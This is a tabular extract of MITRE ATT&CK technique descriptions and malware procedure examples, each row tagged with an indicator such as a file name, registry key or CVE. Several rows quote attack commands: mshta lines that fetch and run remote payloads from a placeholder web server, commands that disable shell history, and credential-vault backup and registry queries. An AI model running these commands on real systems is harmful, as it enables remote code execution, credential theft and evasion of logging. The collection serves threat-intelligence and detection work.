T1202,Indirect Command Execution,"Adversaries may abuse utilities that allow for command execution to bypass security restrictions that limit the use of command-line interpreters. Various Windows utilities may be used to execute commands, possibly without invoking  cmd . For example,  Forfiles , the Program Compatibility Assistant (pcalua.exe), components of the Windows Subsystem for Linux (WSL), as well as other utilities may invoke the execution of programs and commands from a  Command and Scripting Interpreter , Run window, or via scripts.    [1]       [2]      Adversaries may abuse these features for  Defense Evasion , specifically to perform arbitrary execution while subverting detections and/or mitigation controls (such as Group Policy) that limit/prevent the usage of  cmd  or file extensions more commonly associated with malicious payloads.",Description,file,pcalua.exe
T1202,Indirect Command Execution,Lazarus Group  persistence mechanisms have used  forfiles.exe  to execute .htm files.   [3],Procedure Examples,file,forfiles.exe
T1129,Shared Modules,"Adversaries may execute malicious payloads via loading shared modules. The Windows module loader can be instructed to load DLLs from arbitrary local paths and arbitrary Universal Naming Convention (UNC) network paths. This functionality resides in NTDLL.dll and is part of the Windows  Native API  which is called from functions like  CreateProcess ,  LoadLibrary , etc. of the Win32 API.   [1]      The module loader can load DLLs:   Adversaries may use this functionality as a way to execute arbitrary payloads on a victim system. For example, malware may execute share modules to load additional components or features.",Description,file,NTDLL.dll
T1129,Shared Modules,Bumblebee  can use  LoadLibrary  to attempt to execute GdiPlus.dll.   [6],Procedure Examples,file,GdiPlus.dll
T1499.004,Application or System Exploitation,Industroyer  uses a custom DoS tool that leverages CVE-2015-5374 and targets hardcoded IP addresses of Siemens SIPROTEC devices.   [2],Procedure Examples,cve,CVE-2015-5374
T1547.002,Authentication Package,"Adversaries may abuse authentication packages to execute DLLs when the system boots. Windows authentication package DLLs are loaded by the Local Security Authority (LSA) process at system start. They provide support for multiple logon processes and multiple security protocols to the operating system.   [1]      Adversaries can use the autostart mechanism provided by LSA authentication packages for persistence by placing a reference to a binary in the Windows Registry location  HKLM\SYSTEM\CurrentControlSet\Control\Lsa\  with the key value of  ""Authentication Packages""=&lt;target binary&gt; . The binary will then be executed by the system when the authentication packages are loaded.",Description,registry-key,HKLM\SYSTEM\CurrentControlSet\Control\Lsa
T1555.004,Windows Credential Manager,"Adversaries may acquire credentials from the Windows Credential Manager. The Credential Manager stores credentials for signing into websites, applications, and/or devices that request authentication through NTLM or Kerberos in Credential Lockers (previously known as Windows Vaults).   [1]      [2]      The Windows Credential Manager separates website credentials from application or network credentials in two lockers. As part of  Credentials from Web Browsers , Internet Explorer and Microsoft Edge website credentials are managed by the Credential Manager and are stored in the Web Credentials locker. Application and network credentials are stored in the Windows Credentials locker.   Credential Lockers store credentials in encrypted  .vcrd  files, located under  %Systemdrive%\Users\\[Username]\AppData\Local\Microsoft\\[Vault/Credentials]\ . The encryption key can be found in a file named  Policy.vpol , typically located in the same folder as the credentials.   [3]      [4]      Adversaries may list credentials managed by the Windows Credential Manager through several mechanisms.  vaultcmd.exe  is a native Windows executable that can be used to enumerate credentials stored in the Credential Locker through a command-line interface. Adversaries may also gather credentials by directly reading files located inside of the Credential Lockers. Windows APIs, such as  CredEnumerateA , may also be absued to list credentials managed by the Credential Manager.   [5]      [6]      Adversaries may also obtain credentials from credential backups. Credential backups and restorations may be performed by running  rundll32.exe keymgr.dll KRShowKeyMgr  then selecting the ""Back up..."" button on the ""Stored User Names and Passwords"" GUI.   Password recovery tools may also obtain plain text passwords from the Credential Manager.   [4]",Description,file,vaultcmd.exe
T1555.004,Windows Credential Manager,"Adversaries may acquire credentials from the Windows Credential Manager. The Credential Manager stores credentials for signing into websites, applications, and/or devices that request authentication through NTLM or Kerberos in Credential Lockers (previously known as Windows Vaults).   [1]      [2]      The Windows Credential Manager separates website credentials from application or network credentials in two lockers. As part of  Credentials from Web Browsers , Internet Explorer and Microsoft Edge website credentials are managed by the Credential Manager and are stored in the Web Credentials locker. Application and network credentials are stored in the Windows Credentials locker.   Credential Lockers store credentials in encrypted  .vcrd  files, located under  %Systemdrive%\Users\\[Username]\AppData\Local\Microsoft\\[Vault/Credentials]\ . The encryption key can be found in a file named  Policy.vpol , typically located in the same folder as the credentials.   [3]      [4]      Adversaries may list credentials managed by the Windows Credential Manager through several mechanisms.  vaultcmd.exe  is a native Windows executable that can be used to enumerate credentials stored in the Credential Locker through a command-line interface. Adversaries may also gather credentials by directly reading files located inside of the Credential Lockers. Windows APIs, such as  CredEnumerateA , may also be absued to list credentials managed by the Credential Manager.   [5]      [6]      Adversaries may also obtain credentials from credential backups. Credential backups and restorations may be performed by running  rundll32.exe keymgr.dll KRShowKeyMgr  then selecting the ""Back up..."" button on the ""Stored User Names and Passwords"" GUI.   Password recovery tools may also obtain plain text passwords from the Credential Manager.   [4]",Description,file,rundll32.exe
T1555.004,Windows Credential Manager,"Adversaries may acquire credentials from the Windows Credential Manager. The Credential Manager stores credentials for signing into websites, applications, and/or devices that request authentication through NTLM or Kerberos in Credential Lockers (previously known as Windows Vaults).   [1]      [2]      The Windows Credential Manager separates website credentials from application or network credentials in two lockers. As part of  Credentials from Web Browsers , Internet Explorer and Microsoft Edge website credentials are managed by the Credential Manager and are stored in the Web Credentials locker. Application and network credentials are stored in the Windows Credentials locker.   Credential Lockers store credentials in encrypted  .vcrd  files, located under  %Systemdrive%\Users\\[Username]\AppData\Local\Microsoft\\[Vault/Credentials]\ . The encryption key can be found in a file named  Policy.vpol , typically located in the same folder as the credentials.   [3]      [4]      Adversaries may list credentials managed by the Windows Credential Manager through several mechanisms.  vaultcmd.exe  is a native Windows executable that can be used to enumerate credentials stored in the Credential Locker through a command-line interface. Adversaries may also gather credentials by directly reading files located inside of the Credential Lockers. Windows APIs, such as  CredEnumerateA , may also be absued to list credentials managed by the Credential Manager.   [5]      [6]      Adversaries may also obtain credentials from credential backups. Credential backups and restorations may be performed by running  rundll32.exe keymgr.dll KRShowKeyMgr  then selecting the ""Back up..."" button on the ""Stored User Names and Passwords"" GUI.   Password recovery tools may also obtain plain text passwords from the Credential Manager.   [4]",Description,file,keymgr.dll
T1555.004,Windows Credential Manager,Lizar  has a plugin that can retrieve credentials from Internet Explorer and Microsoft Edge using  vaultcmd.exe  and another that can collect RDP access credentials using the  CredEnumerateW  function.   [9],Procedure Examples,file,vaultcmd.exe
T1003.004,LSA Secrets,"Adversaries with SYSTEM access to a host may attempt to access Local Security Authority (LSA) secrets, which can contain a variety of different credential materials, such as credentials for service accounts.   [1]      [2]      [3]    LSA secrets are stored in the registry at  HKEY_LOCAL_MACHINE\SECURITY\Policy\Secrets . LSA secrets can also be dumped from memory.   [4]       Reg  can be used to extract from the Registry.  Mimikatz  can be used to extract secrets from memory.   [4]",Description,registry-key,HKEY_LOCAL_MACHINE\SECURITY\Policy\Secrets
T1003.004,LSA Secrets,"IceApple 's Credential Dumper module can dump LSA secrets from registry keys, including:  HKLM\SECURITY\Policy\PolEKList\default ,  HKLM\SECURITY\Policy\Secrets\*\CurrVal , and  HKLM\SECURITY\Policy\Secrets\*\OldVal .   [13]",Procedure Examples,registry-key,HKLM\SECURITY\Policy\Secrets
T1003.004,LSA Secrets,"IceApple 's Credential Dumper module can dump LSA secrets from registry keys, including:  HKLM\SECURITY\Policy\PolEKList\default ,  HKLM\SECURITY\Policy\Secrets\*\CurrVal , and  HKLM\SECURITY\Policy\Secrets\*\OldVal .   [13]",Procedure Examples,registry-key,HKLM\SECURITY\Policy\PolEKList\default
T1003.004,LSA Secrets,menuPass  has used a modified version of pentesting tools wmiexec.vbs and secretsdump.py to dump credentials.   [19]      [20],Procedure Examples,domain,secretsdump.py
T1008,Fallback Channels,BlackEnergy  has the capability to communicate over a backup channel via plus.google.com.   [7],Procedure Examples,domain,plus.google.com
T1559.001,Component Object Model,FunnyDream  can use com objects identified with  CLSID_ShellLink ( IShellLink  and  IPersistFile ) and  WScript.Shell ( RegWrite  method) to enable persistence mechanisms.   [5],Procedure Examples,domain,wscript.shell
T1559.001,Component Object Model,POWERSTATS  can use DCOM (targeting the 127.0.0.1 loopback address) to execute additional payloads on compromised hosts.   [15],Procedure Examples,ip-address,127.0.0.1
T1562.003,Impair Command History Logging,"Adversaries may impair command history logging to hide commands they run on a compromised system. Various command interpreters keep track of the commands users type in their terminal so that users can retrace what they've done.    On Linux and macOS, command history is tracked in a file pointed to by the environment variable  HISTFILE . When a user logs off a system, this information is flushed to a file in the user's home directory called  ~/.bash_history . The  HISTCONTROL  environment variable keeps track of what should be saved by the  history  command and eventually into the  ~/.bash_history  file when a user logs out.  HISTCONTROL  does not exist by default on macOS, but can be set by the user and will be respected.   Adversaries may clear the history environment variable ( unset HISTFILE ) or set the command history size to zero ( export HISTFILESIZE=0 ) to prevent logging of commands. Additionally,  HISTCONTROL  can be configured to ignore commands that start with a space by simply setting it to ""ignorespace"".  HISTCONTROL  can also be set to ignore duplicate commands by setting it to ""ignoredups"". In some Linux systems, this is set by default to ""ignoreboth"" which covers both of the previous examples. This means that "" ls"" will not be saved, but ""ls"" would be saved by history. Adversaries can abuse this to operate without leaving traces by simply prepending a space to all of their terminal commands.    On Windows systems, the  PSReadLine  module tracks commands used in all PowerShell sessions and writes them to a file ( $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt  by default). Adversaries may change where these logs are saved using  Set-PSReadLineOption -HistorySavePath {File Path} . This will cause  ConsoleHost_history.txt  to stop receiving logs. Additionally, it is possible to turn off logging to this file using the PowerShell command  Set-PSReadlineOption -HistorySaveStyle SaveNothing .   [1]      [2]      [3]      Adversaries may also leverage a  Network Device CLI  on network devices to disable historical command logging (e.g.  no logging ).",Description,path,~/.bash
T1012,Query Registry,BendyBear  can query the host's Registry key at  HKEY_CURRENT_USER\Console\QuickEdit  to retrieve data.   [13],Procedure Examples,registry-key,HKEY_CURRENT_USER\Console\QuickEdit
T1012,Query Registry,Carbanak  checks the Registry key  HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings  for proxy configurations information.   [18],Procedure Examples,registry-key,HKCU\Software\Microsoft\Windows\CurrentVersion\Internet
T1012,Query Registry,Cardinal RAT  contains watchdog functionality that periodically ensures  HKCU\Software\Microsoft\Windows NT\CurrentVersion\Windows\Load  is set to point to its executable.   [21],Procedure Examples,registry-key,HKCU\Software\Microsoft\Windows NT\CurrentVersion\Windows\Load
T1012,Query Registry,Cardinal RAT  contains watchdog functionality that periodically ensures  HKCU\Software\Microsoft\Windows NT\CurrentVersion\Windows\Load  is set to point to its executable.   [21],Procedure Examples,registry-key,HKCU\Software\Microsoft\Windows
T1012,Query Registry,Cobalt Strike  can query  HKEY_CURRENT_USER\Software\Microsoft\Office\ \Excel\Security\AccessVBOM\    to determine if the security setting for restricting default programmatic access is enabled.   [27]      [28],Procedure Examples,registry-key,HKEY_CURRENT_USER\Software\Microsoft\Office
T1012,Query Registry,Crimson  can check the Registry for the presence of  HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\last_edate  to determine how long it has been installed on a host.   [30],Procedure Examples,registry-key,HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\last
T1012,Query Registry,Crimson  can check the Registry for the presence of  HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\last_edate  to determine how long it has been installed on a host.   [30],Procedure Examples,registry-key,HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\last_edate
T1012,Query Registry,FatDuke  can get user agent strings for the default browser from  HKCU\Software\Classes\http\shell\open\command .   [38],Procedure Examples,registry-key,HKCU\Software\Classes\http\shell\open\command
T1012,Query Registry,"A variant of  HOPLIGHT  hooks lsass.exe, and lsass.exe then checks the Registry for the data value 'rdpproto' under the key  SYSTEM\CurrentControlSet\Control\Lsa Name .   [47]",Procedure Examples,file,lsass.exe
T1012,Query Registry,"Lazarus Group  malware IndiaIndia checks Registry keys within HKCU and HKLM to determine if certain applications are present, including SecureCRT, Terminal Services, RealVNC, TightVNC, UltraVNC, Radmin, mRemote, TeamViewer, FileZilla, pcAnyware, and Remote Desktop. Another  Lazarus Group  malware sample checks for the presence of the following Registry key: HKEY_CURRENT_USER\Software\Bitcoin\Bitcoin-Qt .   [54]      [55]      [56]",Procedure Examples,registry-key,HKEY_CURRENT_USER\Software\Bitcoin\Bitcoin
T1012,Query Registry,LiteDuke  can query the Registry to check for the presence of  HKCU\Software\KasperskyLab .   [38],Procedure Examples,registry-key,HKCU\Software\KasperskyLab
T1012,Query Registry,Lucifer  can check for existing stratum cryptomining information in  HKLM\Software\Microsoft\Windows\CurrentVersion\spreadCpuXmr – %stratum info% .   [58],Procedure Examples,registry-key,HKLM\Software\Microsoft\Windows\CurrentVersion\spreadCpuXmr
T1012,Query Registry,Milan  can query  HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Cryptography MachineGuid  to retrieve the machine GUID.   [59],Procedure Examples,registry-key,HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Cryptography
T1012,Query Registry,Mori  can read data from the Registry including from  HKLM\Software\NFC\IPA  and HKLM\Software\NFC\ .   [60],Procedure Examples,registry-key,HKLM\Software\NFC
T1012,Query Registry,Mori  can read data from the Registry including from  HKLM\Software\NFC\IPA  and HKLM\Software\NFC\ .   [60],Procedure Examples,registry-key,HKLM\Software\NFC\IPA
T1012,Query Registry,"OilRig  has used  reg query ""HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Default""  on a victim to query the Registry.   [62]",Procedure Examples,registry-key,HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Default
T1012,Query Registry,"During  Operation Wocao , the threat actors executed  /c cd /d c:\windows\temp\ &amp; reg query HKEY_CURRENT_USER\Software\&lt;username&gt;\PuTTY\Sessions\  to detect recent PuTTY sessions, likely to further lateral movement.   [63]",Procedure Examples,registry-key,HKEY_CURRENT_USER\Software
T1012,Query Registry,Pillowmint  has used shellcode which reads code stored in the registry keys  \REGISTRY\SOFTWARE\Microsoft\DRM  using the native Windows API as well as read  HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\Tcpip\Parameters\Interfaces  as part of its C2.   [65],Procedure Examples,registry-key,HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\Tcpip\Parameters\Interfaces
T1012,Query Registry,Proxysvc  gathers product names from the Registry key:  HKLM\Software\Microsoft\Windows NT\CurrentVersion ProductName  and the processor description from the Registry key  HKLM\HARDWARE\DESCRIPTION\System\CentralProcessor\0 ProcessorNameString .   [72],Procedure Examples,registry-key,HKLM\Software\Microsoft\Windows
T1012,Query Registry,Proxysvc  gathers product names from the Registry key:  HKLM\Software\Microsoft\Windows NT\CurrentVersion ProductName  and the processor description from the Registry key  HKLM\HARDWARE\DESCRIPTION\System\CentralProcessor\0 ProcessorNameString .   [72],Procedure Examples,registry-key,HKLM\HARDWARE\DESCRIPTION\System\CentralProcessor\0
T1012,Query Registry,"RATANKBA  uses the command  reg query ""HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\InternetSettings"" .   [74]",Procedure Examples,registry-key,HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\InternetSettings
T1012,Query Registry,ROKRAT  can access the  HKLM\System\CurrentControlSet\Services\mssmbios\Data\SMBiosData  Registry key to obtain the System manufacturer value to identify the machine type.   [79],Procedure Examples,registry-key,HKLM\System\CurrentControlSet\Services\mssmbios\Data\SMBiosData
T1012,Query Registry,Shark  can query  HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Cryptography MachineGuid  to retrieve the machine GUID.   [59],Procedure Examples,registry-key,HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Cryptography
T1012,Query Registry,"SILENTTRINITY  can use the  GetRegValue  function to check Registry keys within  HKCU\Software\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated  and  HKLM\Software\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated . It also contains additional modules that can check software AutoRun values and use the Win32 namespace to get values from HKCU, HKLM, HKCR, and HKCC hives.   [83]",Procedure Examples,registry-key,HKLM\Software\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated
T1012,Query Registry,"SILENTTRINITY  can use the  GetRegValue  function to check Registry keys within  HKCU\Software\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated  and  HKLM\Software\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated . It also contains additional modules that can check software AutoRun values and use the Win32 namespace to get values from HKCU, HKLM, HKCR, and HKCC hives.   [83]",Procedure Examples,registry-key,HKCU\Software\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated
T1012,Query Registry,SUNBURST  collected the registry value  HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Cryptography\MachineGuid  from compromised hosts.   [88],Procedure Examples,registry-key,HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Cryptography\MachineGuid
T1012,Query Registry,TEARDROP  checked that  HKU\SOFTWARE\Microsoft\CTF  existed before decoding its embedded payload.   [88]      [91],Procedure Examples,registry-key,HKU\SOFTWARE\Microsoft\CTF
T1012,Query Registry,"Waterbear  can query the Registry key  ""HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\MSDTC\MTxOCI""  to see if the value  OracleOcilib  exists.   [100]",Procedure Examples,registry-key,HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\MSDTC\MTxOCI
T1071.001,Web Protocols,APT41  used HTTP to download payloads for CVE-2019-19781 and CVE-2020-10189 exploits.   [26],Procedure Examples,cve,CVE-2020-10189
T1071.001,Web Protocols,APT41  used HTTP to download payloads for CVE-2019-19781 and CVE-2020-10189 exploits.   [26],Procedure Examples,cve,CVE-2019-19781
T1055.012,Process Hollowing,Bandook  has been launched by starting iexplore.exe and replacing it with  Bandook 's payload.   [9]      [10]      [11],Procedure Examples,file,iexplore.exe
T1055.012,Process Hollowing,BBSRAT  has been seen loaded into msiexec.exe through process hollowing to hide its execution.   [14],Procedure Examples,file,msiexec.exe
T1055.012,Process Hollowing,ISMInjector  hollows out a newly created process RegASM.exe and injects its payload into the hollowed process.   [22],Procedure Examples,file,RegASM.exe
T1055.012,Process Hollowing,menuPass  has used process hollowing in iexplore.exe to load the  RedLeaves  implant.   [26],Procedure Examples,file,iexplore.exe
T1055.012,Process Hollowing,A  Patchwork  payload uses process hollowing to hide the UAC bypass vulnerability exploitation inside svchost.exe.   [30],Procedure Examples,file,svchost.exe
T1055.012,Process Hollowing,RCSession  can launch itself from a hollowed svchost.exe process.   [32]      [15]      [33],Procedure Examples,file,svchost.exe
T1055.012,Process Hollowing,The  Saint Bot  loader has used API calls to spawn  MSBuild.exe  in a suspended state before injecting the decrypted  Saint Bot  binary into it.   [34],Procedure Examples,file,MSBuild.exe
T1055.012,Process Hollowing,Smoke Loader  spawns a new copy of c:\windows\syswow64\explorer.exe and then replaces the executable code in memory with malware.   [35]      [36],Procedure Examples,path,c:\windows\syswow64\explorer.exe
T1055.012,Process Hollowing,Smoke Loader  spawns a new copy of c:\windows\syswow64\explorer.exe and then replaces the executable code in memory with malware.   [35]      [36],Procedure Examples,file,explorer.exe
T1055.012,Process Hollowing,A  Threat Group-3390  tool can spawn svchost.exe and inject the payload into that process.   [37]      [38],Procedure Examples,file,svchost.exe
T1055.012,Process Hollowing,TrickBot  injects into the svchost.exe process.   [39]      [40]      [41]      [42],Procedure Examples,file,svchost.exe
T1055.012,Process Hollowing,WhisperGate  has the ability to inject its fourth stage into a suspended process created by the legitimate Windows utility  InstallUtil.exe .   [44],Procedure Examples,file,InstallUtil.exe
T1055.001,Dynamic-link Library Injection,Aria-body  has the ability to inject itself into another process such as rundll32.exe and dllhost.exe.   [5],Procedure Examples,file,rundll32.exe
T1055.001,Dynamic-link Library Injection,Aria-body  has the ability to inject itself into another process such as rundll32.exe and dllhost.exe.   [5],Procedure Examples,file,dllhost.exe
T1055.001,Dynamic-link Library Injection,BlackEnergy  injects its DLL component into svchost.exe.   [7],Procedure Examples,file,svchost.exe
T1055.001,Dynamic-link Library Injection,"During  C0015 , the threat actors used a DLL named  D8B3.dll  that was injected into the Winlogon process.   [10]",Procedure Examples,file,D8B3.dll
T1055.001,Dynamic-link Library Injection,ComRAT  has injected its orchestrator DLL into explorer.exe.  ComRAT  has also injected its communications module into the victim's default browser to make C2 connections appear less suspicious as all network connections will be initiated by the browser process.   [15]      [16],Procedure Examples,file,explorer.exe
T1055.001,Dynamic-link Library Injection,Elise  injects DLL files into iexplore.exe.   [22]      [23],Procedure Examples,file,iexplore.exe
T1055.001,Dynamic-link Library Injection,Emotet  has been observed injecting in to Explorer.exe and other processes.    [25]      [26]      [27],Procedure Examples,file,Explorer.exe
T1055.001,Dynamic-link Library Injection,"The  FunnyDream  FilepakMonitor component can inject into the Bka.exe process using the  VirtualAllocEx ,  WriteProcessMemory  and  CreateRemoteThread  APIs to load the DLL component.   [30]",Procedure Examples,file,Bka.exe
T1055.001,Dynamic-link Library Injection,Heyoka Backdoor  can inject a DLL into rundll32.exe for execution.   [33],Procedure Examples,file,rundll32.exe
T1055.001,Dynamic-link Library Injection,HIDEDRV  injects a DLL for  Downdelph  into the explorer.exe process.   [34],Procedure Examples,file,explorer.exe
T1055.001,Dynamic-link Library Injection,"IronNetInjector  has the ability to inject a DLL into running processes, including the  IronNetInjector  DLL into explorer.exe.   [35]",Procedure Examples,file,explorer.exe
T1055.001,Dynamic-link Library Injection,"If running in a Windows environment,  Kazuar  saves a DLL to disk that is injected into the explorer.exe process to execute the payload.  Kazuar  can also be configured to inject and execute within specific processes.   [36]",Procedure Examples,file,explorer.exe
T1055.001,Dynamic-link Library Injection,MegaCortex  loads  injecthelper.dll  into a newly created  rundll32.exe  process.   [45],Procedure Examples,file,injecthelper.dll
T1055.001,Dynamic-link Library Injection,MegaCortex  loads  injecthelper.dll  into a newly created  rundll32.exe  process.   [45],Procedure Examples,file,rundll32.exe
T1055.001,Dynamic-link Library Injection,Metamorfo  has injected a malicious DLL into the Windows Media Player process (wmplayer.exe).   [46],Procedure Examples,file,wmplayer.exe
T1055.001,Dynamic-link Library Injection,Mongall  can inject a DLL into  rundll32.exe  for execution.   [33],Procedure Examples,file,rundll32.exe
T1055.001,Dynamic-link Library Injection,"An executable dropped onto victims by  Putter Panda  aims to inject the specified DLL into a process that would normally be accessing the network, including Outlook Express (msinm.exe), Outlook (outlook.exe), Internet Explorer (iexplore.exe), and Firefox (firefox.exe).   [55]",Procedure Examples,file,msinm.exe
T1055.001,Dynamic-link Library Injection,"An executable dropped onto victims by  Putter Panda  aims to inject the specified DLL into a process that would normally be accessing the network, including Outlook Express (msinm.exe), Outlook (outlook.exe), Internet Explorer (iexplore.exe), and Firefox (firefox.exe).   [55]",Procedure Examples,file,outlook.exe
T1055.001,Dynamic-link Library Injection,"An executable dropped onto victims by  Putter Panda  aims to inject the specified DLL into a process that would normally be accessing the network, including Outlook Express (msinm.exe), Outlook (outlook.exe), Internet Explorer (iexplore.exe), and Firefox (firefox.exe).   [55]",Procedure Examples,file,iexplore.exe
T1055.001,Dynamic-link Library Injection,"An executable dropped onto victims by  Putter Panda  aims to inject the specified DLL into a process that would normally be accessing the network, including Outlook Express (msinm.exe), Outlook (outlook.exe), Internet Explorer (iexplore.exe), and Firefox (firefox.exe).   [55]",Procedure Examples,file,firefox.exe
T1055.001,Dynamic-link Library Injection,Saint Bot  has injected its DLL component into  EhStorAurhn.exe .   [61],Procedure Examples,file,EhStorAurhn.exe
T1055.001,Dynamic-link Library Injection,SDBbot  has the ability to inject a downloaded DLL into a newly created rundll32.exe process.   [32],Procedure Examples,file,rundll32.exe
T1055.001,Dynamic-link Library Injection,ShadowPad  has injected a DLL into svchost.exe.   [62],Procedure Examples,file,svchost.exe
T1055.001,Dynamic-link Library Injection,"Sykipot  injects itself into running instances of outlook.exe, iexplore.exe, or firefox.exe.   [65]",Procedure Examples,file,outlook.exe
T1055.001,Dynamic-link Library Injection,"Sykipot  injects itself into running instances of outlook.exe, iexplore.exe, or firefox.exe.   [65]",Procedure Examples,file,iexplore.exe
T1055.001,Dynamic-link Library Injection,"Sykipot  injects itself into running instances of outlook.exe, iexplore.exe, or firefox.exe.   [65]",Procedure Examples,file,firefox.exe
T1055.001,Dynamic-link Library Injection,TA505  has been seen injecting a DLL into winword.exe.   [66],Procedure Examples,file,winword.exe
T1055.001,Dynamic-link Library Injection,Tropic Trooper  has injected a DLL backdoor into dllhost.exe and svchost.exe.   [70]      [71],Procedure Examples,file,dllhost.exe
T1055.001,Dynamic-link Library Injection,Tropic Trooper  has injected a DLL backdoor into dllhost.exe and svchost.exe.   [70]      [71],Procedure Examples,file,svchost.exe
T1218.005,Mshta,"Adversaries may abuse mshta.exe to proxy execution of malicious .hta files and Javascript or VBScript through a trusted Windows utility. There are several examples of different types of threats leveraging mshta.exe during initial compromise and for execution of code    [1]       [2]       [3]       [4]       [5]       Mshta.exe is a utility that executes Microsoft HTML Applications (HTA) files.    [6]    HTAs are standalone applications that execute using the same models and technologies of Internet Explorer, but outside of the browser.    [7]      Files may be executed by mshta.exe through an inline script:  mshta vbscript:Close(Execute(""GetObject(""""script:https[:]//webserver/payload[.]sct"""")""))    They may also be executed directly from URLs:  mshta http[:]//webserver/payload[.]hta    Mshta.exe can be used to bypass application control solutions that do not account for its potential use. Since mshta.exe executes outside of the Internet Explorer's security context, it also bypasses browser security settings.    [8]",Description,file,mshta.exe
T1218.005,Mshta,"Adversaries may abuse mshta.exe to proxy execution of malicious .hta files and Javascript or VBScript through a trusted Windows utility. There are several examples of different types of threats leveraging mshta.exe during initial compromise and for execution of code    [1]       [2]       [3]       [4]       [5]       Mshta.exe is a utility that executes Microsoft HTML Applications (HTA) files.    [6]    HTAs are standalone applications that execute using the same models and technologies of Internet Explorer, but outside of the browser.    [7]      Files may be executed by mshta.exe through an inline script:  mshta vbscript:Close(Execute(""GetObject(""""script:https[:]//webserver/payload[.]sct"""")""))    They may also be executed directly from URLs:  mshta http[:]//webserver/payload[.]hta    Mshta.exe can be used to bypass application control solutions that do not account for its potential use. Since mshta.exe executes outside of the Internet Explorer's security context, it also bypasses browser security settings.    [8]",Description,file,Mshta.exe
T1218.005,Mshta,APT32  has used mshta.exe for code execution.   [10]      [11],Procedure Examples,file,mshta.exe
T1218.005,Mshta,BabyShark  has used mshta.exe to download and execute applications from a remote server.   [12],Procedure Examples,file,mshta.exe
T1218.005,Mshta,Confucius  has used mshta.exe to execute malicious VBScript.   [14],Procedure Examples,file,mshta.exe
T1218.005,Mshta,Earth Lusca  has used  mshta.exe  to load an HTA script within a malicious .LNK file.   [15],Procedure Examples,file,mshta.exe
T1218.005,Mshta,FIN7  has used mshta.exe to execute VBScript to execute malicious code on victim systems.   [5],Procedure Examples,file,mshta.exe
T1218.005,Mshta,Gamaredon Group  has used  mshta.exe  to execute malicious HTA files.   [16],Procedure Examples,file,mshta.exe
T1218.005,Mshta,Kimsuky  has used mshta.exe to run malicious scripts on the system.   [18]      [12]      [19]      [20],Procedure Examples,file,mshta.exe
T1218.005,Mshta,Lazarus Group  has used  mshta.exe  to execute HTML pages downloaded by initial access documents.   [23]      [24],Procedure Examples,file,mshta.exe
T1218.005,Mshta,LazyScripter  has used  mshta.exe  to execute  Koadic  stagers.   [22],Procedure Examples,file,mshta.exe
T1218.005,Mshta,Metamorfo  has used mshta.exe to execute a HTA payload.   [25],Procedure Examples,file,mshta.exe
T1218.005,Mshta,MuddyWater  has used mshta.exe to execute its  POWERSTATS  payload and to pass a PowerShell one-liner for execution.   [26]      [27],Procedure Examples,file,mshta.exe
T1218.005,Mshta,Mustang Panda  has used mshta.exe to launch collection scripts.   [28],Procedure Examples,file,mshta.exe
T1218.005,Mshta,NanHaiShu  uses mshta.exe to load its program and files.   [29],Procedure Examples,file,mshta.exe
T1218.005,Mshta,"During  Operation Dust Storm , the threat actors executed JavaScript code via  mshta.exe .   [1]",Procedure Examples,file,mshta.exe
T1218.005,Mshta,POWERSTATS  can use Mshta.exe to execute additional payloads on compromised hosts.   [26],Procedure Examples,file,Mshta.exe
T1218.005,Mshta,Pteranodon  can use mshta.exe to execute an HTA file hosted on a remote server.   [16],Procedure Examples,file,mshta.exe
T1218.005,Mshta,Revenge RAT  uses mshta.exe to run malicious scripts on the system.   [30],Procedure Examples,file,mshta.exe
T1218.005,Mshta,SideCopy  has utilized  mshta.exe  to execute a malicious hta file.   [32],Procedure Examples,file,mshta.exe
T1218.005,Mshta,Sidewinder  has used  mshta.exe  to execute malicious payloads.   [33]      [34],Procedure Examples,file,mshta.exe
T1218.005,Mshta,TA551  has used mshta.exe to execute malicious payloads.   [35],Procedure Examples,file,mshta.exe
T1574.009,Path Interception by Unquoted Path,"Adversaries may execute their own malicious payloads by hijacking vulnerable file path references. Adversaries can take advantage of paths that lack surrounding quotations by placing an executable in a higher level directory within the path, so that Windows will choose the adversary's executable to launch.   Service paths    [1]    and shortcut paths may also be vulnerable to path interception if the path has one or more spaces and is not surrounded by quotation marks (e.g.,  C:\unsafe path with space\program.exe  vs.  ""C:\safe path with space\program.exe"" ).    [2]    (stored in Windows Registry keys) An adversary can place an executable in a higher level directory of the path, and Windows will resolve that executable instead of the intended executable. For example, if the path in a shortcut is  C:\program files\myapp.exe , an adversary may create a program at  C:\program.exe  that will be run instead of the intended program.    [3]       [4]      This technique can be used for persistence if executables are called on a regular basis, as well as privilege escalation if intercepted executables are started by a higher privileged process.",Description,path,C:\program files\myapp.exe
